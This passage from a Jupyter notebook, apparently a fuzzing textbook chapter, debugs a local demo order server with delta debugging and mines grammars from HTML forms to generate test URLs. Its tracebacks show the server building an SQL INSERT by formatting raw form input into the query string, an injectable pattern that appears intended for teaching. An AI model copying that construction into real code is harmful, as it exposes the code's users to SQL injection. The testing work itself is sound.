       "  The server has encountered an internal error.  Go to our <a href=\"/\">order form</a>.\n",
       "  <pre>Traceback (most recent call last):\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/739974898.py\", line 8, in do_GET\n",
       "    self.handle_order()\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/1342827050.py\", line 4, in handle_order\n",
       "    self.store_order(values)\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/1382513861.py\", line 5, in store_order\n",
       "    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n",
       "KeyError: 'name'\n",
       "</pre>\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n",
       "  "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 90,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "clear_httpd_messages()\n",
    "HTML(webbrowser(url))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "How does the URL cause this internal error?  We make use of [delta debugging](Reducer.ipynb) to minimize the failure-inducing path, setting up a `WebRunner` class to define the failure condition:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.013360Z",
     "iopub.status.busy": "2021-11-01T22:34:03.012792Z",
     "iopub.status.idle": "2021-11-01T22:34:03.015391Z",
     "shell.execute_reply": "2021-11-01T22:34:03.015892Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732'"
      ]
     },
     "execution_count": 91,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "failing_path = path\n",
    "failing_path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.019362Z",
     "iopub.status.busy": "2021-11-01T22:34:03.018724Z",
     "iopub.status.idle": "2021-11-01T22:34:03.020263Z",
     "shell.execute_reply": "2021-11-01T22:34:03.020710Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from Fuzzer import Runner"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 93,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.025322Z",
     "iopub.status.busy": "2021-11-01T22:34:03.024801Z",
     "iopub.status.idle": "2021-11-01T22:34:03.026434Z",
     "shell.execute_reply": "2021-11-01T22:34:03.026794Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class WebRunner(Runner):\n",
    "    def __init__(self, base_url=None):\n",
    "        self.base_url = base_url\n",
    "\n",
    "    def run(self, url):\n",
    "        if self.base_url is not None:\n",
    "            url = urljoin(self.base_url, url)\n",
    "\n",
    "        import requests  # for imports\n",
    "        r = requests.get(url)\n",
    "        if r.status_code == HTTPStatus.OK:\n",
    "            return url, Runner.PASS\n",
    "        elif r.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:\n",
    "            return url, Runner.FAIL\n",
    "        else:\n",
    "            return url, Runner.UNRESOLVED"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 94,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.029941Z",
     "iopub.status.busy": "2021-11-01T22:34:03.029390Z",
     "iopub.status.idle": "2021-11-01T22:34:03.036499Z",
     "shell.execute_reply": "2021-11-01T22:34:03.036978Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "('http://127.0.0.1:8800/order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732',\n",
       " 'FAIL')"
      ]
     },
     "execution_count": 94,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_runner = WebRunner(httpd_url)\n",
    "web_runner.run(failing_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "This is the minimized path:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.040144Z",
     "iopub.status.busy": "2021-11-01T22:34:03.039627Z",
     "iopub.status.idle": "2021-11-01T22:34:03.689818Z",
     "shell.execute_reply": "2021-11-01T22:34:03.690484Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from Reducer import DeltaDebuggingReducer  # minor"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.695303Z",
     "iopub.status.busy": "2021-11-01T22:34:03.694609Z",
     "iopub.status.idle": "2021-11-01T22:34:03.766610Z",
     "shell.execute_reply": "2021-11-01T22:34:03.767055Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'order'"
      ]
     },
     "execution_count": 96,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "minimized_path = DeltaDebuggingReducer(web_runner).reduce(failing_path)\n",
    "minimized_path"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "It turns out that our server encounters an internal error if we do not supply the requested fields:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.770894Z",
     "iopub.status.busy": "2021-11-01T22:34:03.770328Z",
     "iopub.status.idle": "2021-11-01T22:34:03.772541Z",
     "shell.execute_reply": "2021-11-01T22:34:03.772910Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'http://127.0.0.1:8800/order'"
      ]
     },
     "execution_count": 97,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "minimized_url = urljoin(httpd_url, minimized_path)\n",
    "minimized_url"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.775838Z",
     "iopub.status.busy": "2021-11-01T22:34:03.775321Z",
     "iopub.status.idle": "2021-11-01T22:34:03.785410Z",
     "shell.execute_reply": "2021-11-01T22:34:03.785798Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:03] \"GET /order HTTP/1.1\" 500 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:03] Traceback (most recent call last):\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/739974898.py\", line 8, in do_GET\n",
       "    self.handle_order()\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/1342827050.py\", line 4, in handle_order\n",
       "    self.store_order(values)\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/1382513861.py\", line 5, in store_order\n",
       "    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n",
       "KeyError: 'item'\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Internal Server Error</strong>\n",
       "  <p>\n",
       "  The server has encountered an internal error.  Go to our <a href=\"/\">order form</a>.\n",
       "  <pre>Traceback (most recent call last):\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/739974898.py\", line 8, in do_GET\n",
       "    self.handle_order()\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/1342827050.py\", line 4, in handle_order\n",
       "    self.store_order(values)\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/1382513861.py\", line 5, in store_order\n",
       "    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n",
       "KeyError: 'item'\n",
       "</pre>\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n",
       "  "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 98,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "clear_httpd_messages()\n",
    "HTML(webbrowser(minimized_url))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We see that we might have a lot to do to make our Web server more robust against unexpected inputs.  The [exercises](#Exercises) give some instructions on what to do."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Extracting Grammars for Input Forms\n",
    "\n",
    "In our previous examples, we have assumed that we have a grammar that produces valid (or less valid) order queries.  However, such a grammar does not need to be specified manually; we can also _extract it automatically_ from a Web page at hand.  This way, we can apply our test generators on arbitrary Web forms without a manual specification step."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Searching HTML for Input Fields\n",
    "\n",
    "The key idea of our approach is to identify all input fields in a form.  To this end, let us take a look at how the individual elements in our order form are encoded in HTML:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.789337Z",
     "iopub.status.busy": "2021-11-01T22:34:03.788816Z",
     "iopub.status.idle": "2021-11-01T22:34:03.796098Z",
     "shell.execute_reply": "2021-11-01T22:34:03.796490Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:03] \"GET / HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<form action=\"/order\" style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
      "  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Swag Order Form</strong>\n",
      "  <p>\n",
      "  Yes! Please send me at your earliest convenience\n",
      "  <select name=\"item\">\n",
      "  <option value=\"tshirt\">One FuzzingBook T-Shirt</option>\n",
      "<option value=\"drill\">One FuzzingBook Rotary Hammer</option>\n",
      "<option value=\"lockset\">One FuzzingBook Lock Set</option>\n",
      "\n",
      "  </select>\n",
      "  <br>\n",
      "  <table>\n",
      "  <tr><td>\n",
      "  <label for=\"name\">Name: </label><input type=\"text\" name=\"name\">\n",
      "  </td><td>\n",
      "  <label for=\"email\">Email: </label><input type=\"email\" name=\"email\"><br>\n",
      "  </td></tr>\n",
      "  <tr><td>\n",
      "  <label for=\"city\">City: </label><input type=\"text\" name=\"city\">\n",
      "  </td><td>\n",
      "  <label for=\"zip\">ZIP Code: </label><input type=\"number\" name=\"zip\">\n",
      "  </tr></tr>\n",
      "  </table>\n",
      "  <input type=\"checkbox\" name=\"terms\"><label for=\"terms\">I have read\n",
      "  the <a href=\"/terms\">terms and conditions</a></label>.<br>\n",
      "  <input type=\"submit\" name=\"submit\" value=\"Place order\">\n",
      "</p>\n",
      "</form>\n"
     ]
    }
   ],
   "source": [
    "html_text = webbrowser(httpd_url)\n",
    "print(html_text[html_text.find(\"<form\"):html_text.find(\"</form>\") + len(\"</form>\")])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "We see that there is a number of form elements that accept inputs, in particular `<input>`, but also `<select>` and `<option>`.  The idea now is to _parse_ the HTML of the Web page in question, to extract these individual input elements, and then to create a _grammar_ that produces a matching URL, effectively filling out the form."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "To parse the HTML page, we could define a grammar to parse HTML and make use of [our own parser infrastructure](Parser.ipynb).  However, it is much easier to not reinvent the wheel and instead build on the existing, dedicated `HTMLParser` class from the Python library."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.799853Z",
     "iopub.status.busy": "2021-11-01T22:34:03.799297Z",
     "iopub.status.idle": "2021-11-01T22:34:03.801457Z",
     "shell.execute_reply": "2021-11-01T22:34:03.801845Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from html.parser import HTMLParser"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "During parsing, we search for `<form>` tags and save the associated action (i.e., the URL to be invoked when the form is submitted) in the `action` attribute.  While processing the form, we create a map `fields` that holds all input fields we have seen; it maps field names to the respective HTML input types (`\"text\"`, `\"number\"`, `\"checkbox\"`, etc.).  Exclusive selection options map to a list of possible values; the `select` stack holds the currently active selection."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 101,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.805506Z",
     "iopub.status.busy": "2021-11-01T22:34:03.804991Z",
     "iopub.status.idle": "2021-11-01T22:34:03.806592Z",
     "shell.execute_reply": "2021-11-01T22:34:03.806958Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "class FormHTMLParser(HTMLParser):\n",
    "    def reset(self):\n",
    "        super().reset()\n",
    "        self.action = \"\"  # Form action\n",
    "        # Map of field name to type (or selection name to [option_1, option_2,\n",
    "        # ...])\n",
    "        self.fields = {}\n",
    "        self.select = []  # Stack of currently active selection names"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "While parsing, the parser calls `handle_starttag()` for every opening tag (such as `<form>`) found; conversely, it invokes `handle_endtag()` for closing tags (such as `</form>`).  `attributes` gives us a map of associated attributes and values.\n",
    "\n",
    "Here is how we process the individual tags:\n",
    "* When we find a `<form>` tag, we save the associated action in the `action` attribute;\n",
    "* When we find an `<input>` tag or similar, we save the type in the `fields` attribute;\n",
    "* When we find a `<select>` tag  or similar, we push its name on the `select` stack;\n",
    "* When we find an `<option>` tag, we append the option to the list associated with the last pushed `<select>` tag."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.813353Z",
     "iopub.status.busy": "2021-11-01T22:34:03.812719Z",
     "iopub.status.idle": "2021-11-01T22:34:03.814277Z",
     "shell.execute_reply": "2021-11-01T22:34:03.814817Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class FormHTMLParser(FormHTMLParser):\n",
    "    def handle_starttag(self, tag, attrs):\n",
    "        attributes = {attr_name: attr_value for attr_name, attr_value in attrs}\n",
    "        # print(tag, attributes)\n",
    "\n",
    "        if tag == \"form\":\n",
    "            self.action = attributes.get(\"action\", \"\")\n",
    "\n",
    "        elif tag == \"select\" or tag == \"datalist\":\n",
    "            if \"name\" in attributes:\n",
    "                name = attributes[\"name\"]\n",
    "                self.fields[name] = []\n",
    "                self.select.append(name)\n",
    "            else:\n",
    "                self.select.append(None)\n",
    "\n",
    "        elif tag == \"option\" and \"multiple\" not in attributes:\n",
    "            current_select_name = self.select[-1]\n",
    "            if current_select_name is not None and \"value\" in attributes:\n",
    "                self.fields[current_select_name].append(attributes[\"value\"])\n",
    "\n",
    "        elif tag == \"input\" or tag == \"option\" or tag == \"textarea\":\n",
    "            if \"name\" in attributes:\n",
    "                name = attributes[\"name\"]\n",
    "                self.fields[name] = attributes.get(\"type\", \"text\")\n",
    "\n",
    "        elif tag == \"button\":\n",
    "            if \"name\" in attributes:\n",
    "                name = attributes[\"name\"]\n",
    "                self.fields[name] = [\"\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.818478Z",
     "iopub.status.busy": "2021-11-01T22:34:03.817842Z",
     "iopub.status.idle": "2021-11-01T22:34:03.819691Z",
     "shell.execute_reply": "2021-11-01T22:34:03.820166Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class FormHTMLParser(FormHTMLParser):\n",
    "    def handle_endtag(self, tag):\n",
    "        if tag == \"select\":\n",
    "            self.select.pop()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Our implementation handles only one form per Web page; it also works on HTML only, ignoring all interaction coming from JavaScript.  Also, it does not support all HTML input types."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Let us put this parser to action.  We create a class `HTMLGrammarMiner` that takes a HTML document to parse.  It then returns the associated action and the associated fields:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.823993Z",
     "iopub.status.busy": "2021-11-01T22:34:03.823475Z",
     "iopub.status.idle": "2021-11-01T22:34:03.825115Z",
     "shell.execute_reply": "2021-11-01T22:34:03.825480Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class HTMLGrammarMiner(object):\n",
    "    def __init__(self, html_text):\n",
    "        html_parser = FormHTMLParser()\n",
    "        html_parser.feed(html_text)\n",
    "        self.fields = html_parser.fields\n",
    "        self.action = html_parser.action"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Applied on our order form, this is what we get:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 105,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.829527Z",
     "iopub.status.busy": "2021-11-01T22:34:03.828981Z",
     "iopub.status.idle": "2021-11-01T22:34:03.831165Z",
     "shell.execute_reply": "2021-11-01T22:34:03.831599Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/order'"
      ]
     },
     "execution_count": 105,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "html_miner = HTMLGrammarMiner(html_text)\n",
    "html_miner.action"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 106,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.835535Z",
     "iopub.status.busy": "2021-11-01T22:34:03.834808Z",
     "iopub.status.idle": "2021-11-01T22:34:03.837463Z",
     "shell.execute_reply": "2021-11-01T22:34:03.837864Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'item': ['tshirt', 'drill', 'lockset'],\n",
       " 'name': 'text',\n",
       " 'email': 'email',\n",
       " 'city': 'text',\n",
       " 'zip': 'number',\n",
       " 'terms': 'checkbox',\n",
       " 'submit': 'submit'}"
      ]
     },
     "execution_count": 106,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "html_miner.fields"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "From this structure, we can now generate a grammar that automatically produces valid form submission URLs."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Mining Grammars for Web Pages"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "To create a grammar from the fields extracted from HTML, we build on the `CGI_GRAMMAR` defined in the [chapter on grammars](Grammars.ipynb).  The key idea is to define rules for every HTML input type: An HTML `number` type will get values from the `<number>` rule; likewise, values for the HTML `email` type will be defined from the `<email>` rule.  Our default grammar provides very simple rules for these types."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 107,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.841540Z",
     "iopub.status.busy": "2021-11-01T22:34:03.840910Z",
     "iopub.status.idle": "2021-11-01T22:34:03.842793Z",
     "shell.execute_reply": "2021-11-01T22:34:03.843287Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from Grammars import crange, srange, new_symbol, unreachable_nonterminals, CGI_GRAMMAR, extend_grammar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.848162Z",
     "iopub.status.busy": "2021-11-01T22:34:03.847632Z",
     "iopub.status.idle": "2021-11-01T22:34:03.849266Z",
     "shell.execute_reply": "2021-11-01T22:34:03.849636Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class HTMLGrammarMiner(HTMLGrammarMiner):\n",
    "    QUERY_GRAMMAR = extend_grammar(CGI_GRAMMAR, {\n",
    "        \"<start>\": [\"<action>?<query>\"],\n",
    "\n",
    "        \"<text>\": [\"<string>\"],\n",
    "\n",
    "        \"<number>\": [\"<digits>\"],\n",
    "        \"<digits>\": [\"<digit>\", \"<digits><digit>\"],\n",
    "        \"<digit>\": crange('0', '9'),\n",
    "\n",
    "        \"<checkbox>\": [\"<_checkbox>\"],\n",
    "        \"<_checkbox>\": [\"on\", \"off\"],\n",
    "\n",
    "        \"<email>\": [\"<_email>\"],\n",
    "        \"<_email>\": [cgi_encode(\"<string>@<string>\", \"<>\")],\n",
    "\n",
    "        # Use a fixed password in case we need to repeat it\n",
    "        \"<password>\": [\"<_password>\"],\n",
    "        \"<_password>\": [\"abcABC.123\"],\n",
    "\n",
    "        # Stick to printable characters to avoid logging problems\n",
    "        \"<percent>\": [\"%<hexdigit-1><hexdigit>\"],\n",
    "        \"<hexdigit-1>\": srange(\"34567\"),\n",
    "        \n",
    "        # Submissions:\n",
    "        \"<submit>\": [\"\"]\n",
    "    })"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Our grammar miner now takes the fields extracted from HTML, converting them into rules.  Essentially, every input field encountered gets included in the resulting query URL; and it gets a rule expanding it into the appropriate type."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 109,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.855395Z",
     "iopub.status.busy": "2021-11-01T22:34:03.854863Z",
     "iopub.status.idle": "2021-11-01T22:34:03.856568Z",
     "shell.execute_reply": "2021-11-01T22:34:03.857004Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class HTMLGrammarMiner(HTMLGrammarMiner):\n",
    "    def mine_grammar(self):\n",
    "        grammar = extend_grammar(self.QUERY_GRAMMAR)\n",
    "        grammar[\"<action>\"] = [self.action]\n",
    "\n",
    "        query = \"\"\n",
    "        for field in self.fields:\n",
    "            field_symbol = new_symbol(grammar, \"<\" + field + \">\")\n",
    "            field_type = self.fields[field]\n",
    "\n",
    "            if query != \"\":\n",
    "                query += \"&\"\n",
    "            query += field_symbol\n",
    "\n",
    "            if isinstance(field_type, str):\n",
    "                field_type_symbol = \"<\" + field_type + \">\"\n",
    "                grammar[field_symbol] = [field + \"=\" + field_type_symbol]\n",
    "                if field_type_symbol not in grammar:\n",
    "                    # Unknown type\n",
    "                    grammar[field_type_symbol] = [\"<text>\"]\n",
    "            else:\n",
    "                # List of values\n",
    "                value_symbol = new_symbol(grammar, \"<\" + field + \"-value>\")\n",
    "                grammar[field_symbol] = [field + \"=\" + value_symbol]\n",
    "                grammar[value_symbol] = field_type\n",
    "\n",
    "        grammar[\"<query>\"] = [query]\n",
    "\n",
    "        # Remove unused parts\n",
    "        for nonterminal in unreachable_nonterminals(grammar):\n",
    "            del grammar[nonterminal]\n",
    "\n",
    "        assert is_valid_grammar(grammar)\n",
    "\n",
    "        return grammar"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Let us show `HTMLGrammarMiner` in action, again applied on our order form.  Here is the full resulting grammar:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.863008Z",
     "iopub.status.busy": "2021-11-01T22:34:03.862425Z",
     "iopub.status.idle": "2021-11-01T22:34:03.864791Z",
     "shell.execute_reply": "2021-11-01T22:34:03.865172Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'<start>': ['<action>?<query>'],\n",
       " '<string>': ['<letter>', '<letter><string>'],\n",
       " '<letter>': ['<plus>', '<percent>', '<other>'],\n",
       " '<plus>': ['+'],\n",
       " '<percent>': ['%<hexdigit-1><hexdigit>'],\n",
       " '<hexdigit>': ['0',\n",
       "  '1',\n",
       "  '2',\n",
       "  '3',\n",
       "  '4',\n",
       "  '5',\n",
       "  '6',\n",
       "  '7',\n",
       "  '8',\n",
       "  '9',\n",
       "  'a',\n",
       "  'b',\n",
       "  'c',\n",
       "  'd',\n",
       "  'e',\n",
       "  'f'],\n",
       " '<other>': ['0', '1', '2', '3', '4', '5', 'a', 'b', 'c', 'd', 'e', '-', '_'],\n",
       " '<text>': ['<string>'],\n",
       " '<number>': ['<digits>'],\n",
       " '<digits>': ['<digit>', '<digits><digit>'],\n",
       " '<digit>': ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],\n",
       " '<checkbox>': ['<_checkbox>'],\n",
       " '<_checkbox>': ['on', 'off'],\n",
       " '<email>': ['<_email>'],\n",
       " '<_email>': ['<string>%40<string>'],\n",
       " '<hexdigit-1>': ['3', '4', '5', '6', '7'],\n",
       " '<submit>': [''],\n",
       " '<action>': ['/order'],\n",
       " '<item>': ['item=<item-value>'],\n",
       " '<item-value>': ['tshirt', 'drill', 'lockset'],\n",
       " '<name>': ['name=<text>'],\n",
       " '<email-1>': ['email=<email>'],\n",
       " '<city>': ['city=<text>'],\n",
       " '<zip>': ['zip=<number>'],\n",
       " '<terms>': ['terms=<checkbox>'],\n",
       " '<submit-1>': ['submit=<submit>'],\n",
       " '<query>': ['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']}"
      ]
     },
     "execution_count": 110,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "html_miner = HTMLGrammarMiner(html_text)\n",
    "grammar = html_miner.mine_grammar()\n",
    "grammar"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Let us take a look into the structure of the grammar.  It produces URL paths of this form:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.868728Z",
     "iopub.status.busy": "2021-11-01T22:34:03.868170Z",
     "iopub.status.idle": "2021-11-01T22:34:03.870415Z",
     "shell.execute_reply": "2021-11-01T22:34:03.870780Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<action>?<query>']"
      ]
     },
     "execution_count": 111,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "grammar[\"<start>\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Here, the `<action>` comes from the `action` attribute of the HTML form:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 112,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.874096Z",
     "iopub.status.busy": "2021-11-01T22:34:03.873549Z",
     "iopub.status.idle": "2021-11-01T22:34:03.875699Z",
     "shell.execute_reply": "2021-11-01T22:34:03.876125Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/order']"
      ]
     },
     "execution_count": 112,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "grammar[\"<action>\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "The `<query>` is composed from the individual field items:"
   ]
  },
  {
   "cell_type": "code",
